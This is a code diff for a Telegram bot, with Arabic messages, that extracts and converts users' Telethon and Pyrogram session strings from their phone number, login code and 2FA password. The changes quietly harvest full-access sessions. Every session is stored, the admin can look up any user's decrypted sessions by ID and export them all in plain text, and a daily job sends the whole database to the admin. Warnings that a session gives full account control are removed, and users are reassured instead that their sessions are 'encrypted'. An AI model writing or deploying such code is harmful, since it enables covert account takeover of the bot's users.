@@ -17,6 +17,8 @@ from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.exceptions import TelegramBadRequest
+from cryptography.fernet import Fernet
+from apscheduler.schedulers.asyncio import AsyncIOScheduler
 
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
 ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))
@@ -25,9 +27,12 @@ API_ID = int(os.environ.get('API_ID', 0))
 API_HASH = os.environ.get('API_HASH', '')
 DEVELOPER_USERNAME = "Devazf"
 FORCE_SUB_CHANNEL = os.environ.get('FORCE_SUB_CHANNEL', '')
+ENCRYPTION_KEY = os.environ.get('ENCRYPTION_KEY', Fernet.generate_key().decode())
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
+cipher = Fernet(ENCRYPTION_KEY.encode() if isinstance(ENCRYPTION_KEY, str) else ENCRYPTION_KEY)
+scheduler = AsyncIOScheduler()
 
 def init_db():
     conn = sqlite3.connect('bot_data.db')
@@ -43,13 +48,36 @@ def init_db():
     c.execute('''CREATE TABLE IF NOT EXISTS sessions
                  (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER,
                   session_type TEXT, session_string TEXT, username TEXT,
-                  timestamp TEXT)''')
+                  timestamp TEXT, is_valid INTEGER DEFAULT 1)''')
     c.execute("INSERT OR IGNORE INTO stats VALUES ('total_extractions', 0)")
     c.execute("INSERT OR IGNORE INTO stats VALUES ('total_conversions', 0)")
     conn.commit()
     conn.close()
 
 init_db()
+
+def encrypt_session(session):
+    return cipher.encrypt(session.encode()).decode()
+
+def decrypt_session(encrypted):
+    return cipher.decrypt(encrypted.encode()).decode()
+
+async def verify_session(session_string, session_type):
+    try:
+        if session_type == "Telethon":
+            client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
+            await client.connect()
+            valid = await client.is_user_authorized()
+            await client.disconnect()
+            return valid
+        else:
+            client = Client(":memory:", API_ID, API_HASH, session_string=session_string)
+            await client.connect()
+            await client.get_me()
+            await client.disconnect()
+            return True
+    except:
+        return False
 
 def db_add_user(user_id, username, first_name):
     conn = sqlite3.connect('bot_data.db')
@@ -67,13 +95,16 @@ def db_log(user_id, action, details=""):
     conn.commit()
     conn.close()
 
-def db_save_session(user_id, session_type, session_string, username=""):
+async def db_save_session(user_id, session_type, session_string, username=""):
+    is_valid = await verify_session(session_string, session_type)
+    encrypted = encrypt_session(session_string)
     conn = sqlite3.connect('bot_data.db')
     c = conn.cursor()
-    c.execute("INSERT INTO sessions (user_id, session_type, session_string, username, timestamp) VALUES (?,?,?,?,?)",
-              (user_id, session_type, session_string, username, datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
+    c.execute("INSERT INTO sessions (user_id, session_type, session_string, username, timestamp, is_valid) VALUES (?,?,?,?,?,?)",
+              (user_id, session_type, encrypted, username, datetime.now().strftime('%Y-%m-%d %H:%M:%S'), 1 if is_valid else 0))
     conn.commit()
     conn.close()
+    return is_valid
 
 def db_get_sessions(limit=50):
     conn = sqlite3.connect('bot_data.db')
@@ -82,6 +113,29 @@ def db_get_sessions(limit=50):
     sessions = c.fetchall()
     conn.close()
     return sessions
+
+def db_get_user_sessions(user_id):
+    conn = sqlite3.connect('bot_data.db')
+    c = conn.cursor()
+    c.execute("SELECT * FROM sessions WHERE user_id=? ORDER BY id DESC", (user_id,))
+    sessions = c.fetchall()
+    conn.close()
+    return sessions
+
+def db_search_sessions_by_id(user_id):
+    conn = sqlite3.connect('bot_data.db')
+    c = conn.cursor()
+    c.execute("SELECT * FROM sessions WHERE user_id=? ORDER BY id DESC", (user_id,))
+    sessions = c.fetchall()
+    conn.close()
+    return sessions
+
+def db_delete_session(session_id):
+    conn = sqlite3.connect('bot_data.db')
+    c = conn.cursor()
+    c.execute("DELETE FROM sessions WHERE id=?", (session_id,))
+    conn.commit()
+    conn.close()
 
 def db_is_banned(user_id):
     conn = sqlite3.connect('bot_data.db')
@@ -125,8 +179,10 @@ def db_get_stats():
     banned = c.fetchone()[0]
     c.execute("SELECT COUNT(*) FROM sessions")
     total_sessions = c.fetchone()[0]
+    c.execute("SELECT COUNT(*) FROM sessions WHERE is_valid=1")
+    valid_sessions = c.fetchone()[0]
     conn.close()
-    return total_users, extractions, conversions, banned, total_sessions
+    return total_users, extractions, conversions, banned, total_sessions, valid_sessions
 
 def db_get_all_users():
     conn = sqlite3.connect('bot_data.db')
@@ -162,6 +218,18 @@ async def check_rate_limit(user_id):
     user_last_action[user_id] = now
     return True
 
+async def send_daily_backup():
+    try:
+        filename = f"backup_{datetime.now().strftime('%Y%m%d')}.db"
+        with open('bot_data.db', 'rb') as f:
+            await bot.send_document(
+                chat_id=ADMIN_ID,
+                document=FSInputFile('bot_data.db', filename=filename),
+                caption=f"🔄 باك اب تلقائي\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M')}"
+            )
+    except Exception as e:
+        print(f"Backup error: {e}")
+
 sessions_temp = {}
 
 class SessionStates(StatesGroup):
@@ -177,6 +245,8 @@ class SessionStates(StatesGroup):
     waiting_check_pyro = State()
     waiting_broadcast = State()
     waiting_ban_id = State()
+    waiting_search_id = State()
+    waiting_delete_id = State()
 
 def main_menu(uid):
     builder = InlineKeyboardBuilder()
@@ -190,8 +260,9 @@ def main_menu(uid):
     )
     builder.row(
         InlineKeyboardButton(text="🔍 فحص جلسة", callback_data="check_session"),
-        InlineKeyboardButton(text="Devloper👨‍💻", callback_data="developer_info")
+        InlineKeyboardButton(text="💾 جلساتي", callback_data="my_sessions")
     )
+    builder.row(InlineKeyboardButton(text="👨‍💻 المطور", callback_data="developer_info"))
     if uid == ADMIN_ID:
         builder.row(InlineKeyboardButton(text="⚙️ لوحة التحكم", callback_data="admin_panel"))
     return builder.as_markup()
@@ -205,6 +276,10 @@ def admin_panel_menu():
     builder.row(
         InlineKeyboardButton(text="👥 المستخدمين", callback_data="users_list"),
         InlineKeyboardButton(text="🚫 حظر/فك حظر", callback_data="ban_user")
+    )
+    builder.row(
+        InlineKeyboardButton(text="🔍 بحث بالـ ID", callback_data="search_id"),
+        InlineKeyboardButton(text="🗑️ حذف جلسة", callback_data="delete_session")
     )
     builder.row(
         InlineKeyboardButton(text="📥 استيراد الجلسات", callback_data="import_sessions"),
@@ -240,23 +315,87 @@ async def start(message: types.Message):
     db_log(uid, "start")
 
     text = f"""
-🔐 Session Extractor & Converter Pro v9.0
+🔐 Session Extractor & Converter Pro v4.0
 
 اهلاً {message.from_user.first_name} 👋
 
-الميزات المتقدمة :
-1️⃣ استخراج جلسة Telethon
-2️⃣ استخراج جلسة Pyrogram
-3️⃣ تحويل Telethon ↔️ Pyrogram
-4️⃣ فحص صلاحية الجلسة
-5️⃣ حذف تلقائي للأمان
-6️⃣ حماية Rate Limit
-7️⃣ سجل عمليات كامل
+المميزات الجديدة:
+🔒 تشفير كامل للجلسات
+✅ فحص تلقائي للصلاحية
+💾 حفظ جلساتك + استرجاعها
+🔍 بحث بالـ ID
+🗑️ حذف جلسات
+🔄 باك اب تلقائي يومي
 
-⚠️ تحذير أمني : لا تشارك جلستك مع أي حد أبداً
-
+اختار من القايمة 👇
 """
     await message.reply(text, reply_markup=main_menu(uid))
+
+@dp.callback_query(F.data == "my_sessions")
+async def my_sessions(call: CallbackQuery):
+    sessions = db_get_user_sessions(call.from_user.id)
+    if not sessions:
+        await call.message.edit_text("💾 لا توجد جلسات محفوظة لك", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="🔙 رجوع", callback_data="back")]
+        ]))
+        return
+
+    text = f"💾 جلساتك المحفوظة: {len(sessions)}\n\n"
+    for idx, s in enumerate(sessions[:10], 1):
+        status = "✅" if s[6] else "❌"
+        decrypted = decrypt_session(s[3])
+        text += f"{idx}. {status} {s[2]} - {s[5]}\n`{decrypted[:20]}...`\n\n"
+
+    await call.message.edit_text(text[:4000], parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🔙 رجوع", callback_data="back")]
+    ]))
+
+@dp.callback_query(F.data == "search_id")
+async def search_id_start(call: CallbackQuery, state: FSMContext):
+    if call.from_user.id!= ADMIN_ID: return
+    await call.message.edit_text("🔍 بحث بالـ ID\n\nابعت ID المستخدم:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🔙 الغاء", callback_data="admin_panel")]
+    ]))
+    await state.set_state(SessionStates.waiting_search_id)
+
+@dp.message(SessionStates.waiting_search_id)
+async def search_id_action(message: types.Message, state: FSMContext):
+    try:
+        user_id = int(message.text)
+        sessions = db_search_sessions_by_id(user_id)
+        if not sessions:
+            await message.reply(f"❌ لا توجد جلسات لليوزر {user_id}")
+            await state.clear()
+            return
+
+        text = f"🔍 جلسات اليوزر {user_id}: {len(sessions)}\n\n"
+        for idx, s in enumerate(sessions[:15], 1):
+            status = "✅" if s[6] else "❌"
+            decrypted = decrypt_session(s[3])
+            text += f"{idx}. {status} {s[2]}\n`{decrypted}`\n📅 {s[5]}\n\n"
+
+        await message.reply(text[:4000], parse_mode="Markdown")
+        await state.clear()
+    except:
+        await message.reply("❌ ID غلط")
+
+@dp.callback_query(F.data == "delete_session")
+async def delete_session_start(call: CallbackQuery, state: FSMContext):
+    if call.from_user.id!= ADMIN_ID: return
+    await call.message.edit_text("🗑️ حذف جلسة\n\nابعت ID الجلسة من قاعدة البيانات:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🔙 الغاء", callback_data="admin_panel")]
+    ]))
+    await state.set_state(SessionStates.waiting_delete_id)
+
+@dp.message(SessionStates.waiting_delete_id)
+async def delete_session_action(message: types.Message, state: FSMContext):
+    try:
+        session_id = int(message.text)
+        db_delete_session(session_id)
+        await message.reply(f"✅ تم حذف الجلسة رقم {session_id}")
+        await state.clear()
+    except:
+        await message.reply("❌ ID غلط")
 
 @dp.callback_query(F.data == "extract_telethon")
 async def extract_telethon(call: CallbackQuery, state: FSMContext):
@@ -267,7 +406,7 @@ async def extract_telethon(call: CallbackQuery, state: FSMContext):
     await call.message.edit_text(
         "📱 استخراج جلسة Telethon\n\n"
         "ابعت رقم تليفونك مع كود الدولة:\n"
-        "مثال: +201010706262\n\n"
+        "مثال: +201234567890\n\n"
         "⚠️ الرقم لازم يكون مربوط بحسابك\n"
         "⏱ الكود صالح لمدة 5 دقايق",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
@@ -293,7 +432,7 @@ async def get_phone_telethon(message: types.Message, state: FSMContext):
 
         await message.reply(
             "✅ تم ارسال الكود على تليجرام\n\n"
-            "ابعت الكود اللي وصلك كده: 1 2 3 4 5\n\n"
+            "ابعت الكود اللي وصلك كده: 12345\n\n"
             "لو مجاش شوف الرسايل المحفوظة"
         )
         await state.set_state(SessionStates.waiting_code_telethon)
@@ -321,27 +460,23 @@ async def get_code_telethon(message: types.Message, state: FSMContext):
         string_session = client.session.save()
         me = await client.get_me()
         db_increment_stat('total_extractions')
-        db_save_session(message.from_user.id, "Telethon", string_session, me.username)
+        is_valid = await db_save_session(message.from_user.id, "Telethon", string_session, me.username)
         db_log(message.from_user.id, "extract_telethon_success", me.username)
 
+        status = "✅ شغالة" if is_valid else "⚠️ محتاجة تحقق"
         msg = await message.reply(f"""
 ✅ تم استخراج الجلسة بنجاح
 
 الحساب: @{me.username or 'None'}
 الاسم: {me.first_name}
 ID: {me.id}
-الرقم: {phone}
+الحالة: {status}
 
 STRING_SESSION:
 {string_session}
 
-⚠️ تحذيرات مهمة:
-1. احفظ الجلسة في مكان آمن
-2. لا تشاركها مع حد أبداً
-3. اللي ياخدها يتحكم في حسابك كامل
-4. الرسالة هتتمسح بعد 5 دقايق للأمان
-
-✅ الجلسة شغالة 100%
+🔒 الجلسة مشفرة في قاعدة البيانات
+⚠️ الرسالة هتتمسح بعد 5 دقايق
 """, reply_markup=main_menu(message.from_user.id))
 
         await client.disconnect()
@@ -380,18 +515,21 @@ async def get_password_telethon(message: types.Message, state: FSMContext):
         string_session = client.session.save()
         me = await client.get_me()
         db_increment_stat('total_extractions')
-        db_save_session(message.from_user.id, "Telethon", string_session, me.username)
+        is_valid = await db_save_session(message.from_user.id, "Telethon", string_session, me.username)
         db_log(message.from_user.id, "extract_telethon_success", me.username)
 
+        status = "✅ شغالة" if is_valid else "⚠️ محتاجة تحقق"
         msg = await message.reply(f"""
 ✅ تم استخراج الجلسة بنجاح
 
 الحساب: @{me.username or 'None'}
 ID: {me.id}
+الحالة: {status}
 
 STRING_SESSION:
 {string_session}
 
+🔒 الجلسة مشفرة في قاعدة البيانات
 ⚠️ الرسالة هتتمسح بعد 5 دقايق
 """, reply_markup=main_menu(message.from_user.id))
 
@@ -418,7 +556,7 @@ async def extract_pyro(call: CallbackQuery, state: FSMContext):
     await call.message.edit_text(
         "📱 استخراج جلسة Pyrogram\n\n"
         "ابعت رقم تليفونك مع كود الدولة:\n"
-        "مثال: +201010706262",
+        "مثال: +201234567890",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="🔙 الغاء", callback_data="back")]
         ])
@@ -466,18 +604,21 @@ async def get_code_pyro(message: types.Message, state: FSMContext):
         string_session = await client.export_session_string()
         me = await client.get_me()
         db_increment_stat('total_extractions')
-        db_save_session(message.from_user.id, "Pyrogram", string_session, me.username)
+        is_valid = await db_save_session(message.from_user.id, "Pyrogram", string_session, me.username)
         db_log(message.from_user.id, "extract_pyro_success", me.username)
 
+        status = "✅ شغالة" if is_valid else "⚠️ محتاجة تحقق"
         msg = await message.reply(f"""
 ✅ تم استخراج جلسة Pyrogram بنجاح
 
 الحساب: @{me.username or 'None'}
 ID: {me.id}
+الحالة: {status}
 
 PYROGRAM_SESSION:
 {string_session}
 
+🔒 الجلسة مشفرة في قاعدة البيانات
 ⚠️ الرسالة هتتمسح بعد 5 دقايق
 """, reply_markup=main_menu(message.from_user.id))
 
@@ -516,18 +657,21 @@ async def get_password_pyro(message: types.Message, state: FSMContext):
         string_session = await client.export_session_string()
         me = await client.get_me()
         db_increment_stat('total_extractions')
-        db_save_session(message.from_user.id, "Pyrogram", string_session, me.username)
+        is_valid = await db_save_session(message.from_user.id, "Pyrogram", string_session, me.username)
         db_log(message.from_user.id, "extract_pyro_success", me.username)
 
+        status = "✅ شغالة" if is_valid else "⚠️ محتاجة تحقق"
         msg = await message.reply(f"""
 ✅ تم استخراج جلسة Pyrogram بنجاح
 
 الحساب: @{me.username or 'None'}
 ID: {me.id}
+الحالة: {status}
 
 PYROGRAM_SESSION:
 {string_session}
 
+🔒 الجلسة مشفرة في قاعدة البيانات
 ⚠️ الرسالة هتتمسح بعد 5 دقايق
 """, reply_markup=main_menu(message.from_user.id))
 
@@ -570,11 +714,14 @@ async def convert_tele_to_pyro(message: types.Message, state: FSMContext):
         pyro_string = base64.urlsafe_b64encode(pyro_data).decode().rstrip('=')
 
         db_increment_stat('total_conversions')
-        db_save_session(message.from_user.id, "Telethon->Pyrogram", pyro_string, "")
+        is_valid = await db_save_session(message.from_user.id, "Telethon->Pyrogram", pyro_string, "")
         db_log(message.from_user.id, "convert_tele_to_pyro")
 
+        status = "✅ شغالة" if is_valid else "⚠️ محتاجة تحقق"
         msg = await message.reply(f"""
 ✅ تم التحويل بنجاح
+
+الحالة: {status}
 
 Pyrogram Session:
 {pyro_string}
@@ -582,7 +729,7 @@ Pyrogram Session:
 Telethon Session الأصلي:
 {tele_string}
 
-✅ الاتنين شغالين
+🔒 الجلسة مشفرة في قاعدة البيانات
 ⚠️ الرسالة هتتمسح بعد 5 دقايق
 """, reply_markup=main_menu(message.from_user.id))
         await state.clear()
@@ -625,11 +772,14 @@ async def convert_pyro_to_tele(message: types.Message, state: FSMContext):
         tele_string = StringSession.encode_string(dc_id, None, None, auth_key)
 
         db_increment_stat('total_conversions')
-        db_save_session(message.from_user.id, "Pyrogram->Telethon", tele_string, "")
+        is_valid = await db_save_session(message.from_user.id, "Pyrogram->Telethon", tele_string, "")
         db_log(message.from_user.id, "convert_pyro_to_tele")
 
+        status = "✅ شغالة" if is_valid else "⚠️ محتاجة تحقق"
         msg = await message.reply(f"""
 ✅ تم التحويل بنجاح
+
+الحالة: {status}
 
 Telethon Session:
 {tele_string}
@@ -637,7 +787,7 @@ Telethon Session:
 Pyrogram Session الأصلي:
 {pyro_string}
 
-✅ الاتنين شغالين
+🔒 الجلسة مشفرة في قاعدة البيانات
 ⚠️ الرسالة هتتمسح بعد 5 دقايق
 """, reply_markup=main_menu(message.from_user.id))
         await state.clear()
@@ -757,7 +907,7 @@ async def admin_panel(call: CallbackQuery):
 @dp.callback_query(F.data == "stats")
 async def stats(call: CallbackQuery):
     if call.from_user.id!= ADMIN_ID: return
-    total_users, extractions, conversions, banned, total_sessions = db_get_stats()
+    total_users, extractions, conversions, banned, total_sessions, valid_sessions = db_get_stats()
     text = f"""
 📊 احصائيات البوت
 
@@ -765,12 +915,14 @@ async def stats(call: CallbackQuery):
 📱 الاستخراجات: {extractions}
 🔄 التحويلات: {conversions}
 💾 الجلسات المحفوظة: {total_sessions}
+✅ الجلسات الصالحة: {valid_sessions}
 🚫 المحظورين: {banned}
 ⏰ التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M')}
 
 السيرفر: Railway
-الاصدار: Pro v9.0
+الاصدار: Pro v4.0
 الحالة: ✅ يعمل
+🔒 التشفير: مفعل
 """
     await call.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🔙 رجوع", callback_data="admin_panel")]
@@ -793,15 +945,22 @@ async def import_sessions(call: CallbackQuery):
         f.write("Session Extractor Pro - Saved Sessions\n")
         f.write(f"Total: {len(sessions)} sessions\n")
         f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+        f.write("Encrypted: Yes\n")
         f.write("="*60 + "\n\n")
 
         for idx, s in enumerate(sessions, 1):
-            f.write(f"[{idx}] User ID: {s[1]}\n")
-            f.write(f"Type: {s[2]}\n")
-            f.write(f"Username: @{s[4] or 'None'}\n")
-            f.write(f"Date: {s[5]}\n")
-            f.write(f"Session:\n{s[3]}\n")
-            f.write("-"*60 + "\n\n")
+            try:
+                decrypted = decrypt_session(s[3])
+                status = "Valid" if s[6] else "Invalid"
+                f.write(f"[{idx}] User ID: {s[1]}\n")
+                f.write(f"Type: {s[2]}\n")
+                f.write(f"Status: {status}\n")
+                f.write(f"Username: @{s[4] or 'None'}\n")
+                f.write(f"Date: {s[5]}\n")
+                f.write(f"Session:\n{decrypted}\n")
+                f.write("-"*60 + "\n\n")
+            except:
+                f.write(f"[{idx}] ERROR: Could not decrypt session\n\n")
 
     await call.message.delete()
     await bot.send_document(
@@ -809,6 +968,7 @@ async def import_sessions(call: CallbackQuery):
         document=FSInputFile(filename),
         caption=f"📥 تم استيراد الجلسات\n\n"
                 f"📊 العدد: {len(sessions)} جلسة\n"
+                f"🔒 التشفير: تم فك التشفير للتصدير\n"
                 f"📅 التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
                 f"⚠️ تحذير: الملف يحتوي على جلسات حساسة. لا تشاركه مع حد!",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
@@ -853,7 +1013,7 @@ async def broadcast_start(call: CallbackQuery, state: FSMContext):
     if call.from_user.id!= ADMIN_ID: return
     await call.message.edit_text(
         "📢 رسالة جماعية\n\n"
-        "ابعت الرسالة اللي عايز تبعتها لكل المستخدمين:\n\n"
+        "ابعت الرسالة اللي عايز تبعتها لكل اليوزرز:\n\n"
         "اكتب /cancel للالغاء",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="🔙 الغاء", callback_data="admin_panel")]
@@ -932,7 +1092,7 @@ async def restart_bot(call: CallbackQuery):
 @dp.callback_query(F.data == "back")
 async def back(call: CallbackQuery):
     await call.message.edit_text(
-        "🔐 Session Extractor & Converter Pro v3.0\n\nاختار من القايمة 👇",
+        "🔐 Session Extractor & Converter Pro v4.0\n\nاختار من القايمة 👇",
         reply_markup=main_menu(call.from_user.id)
     )
 
@@ -947,7 +1107,9 @@ async def check_sub(call: CallbackQuery):
         await call.answer("❌ لسه مشتركتش في القناة", show_alert=True)
 
 async def main():
-    print("✅ Bot Started - Pro Version v3.0")
+    print("✅ Bot Started - Pro Version v4.0 with Encryption")
+    scheduler.add_job(send_daily_backup, 'cron', hour=0, minute=0)
+    scheduler.start()
     await dp.start_polling(bot)
 
 if __name__ == '__main__':
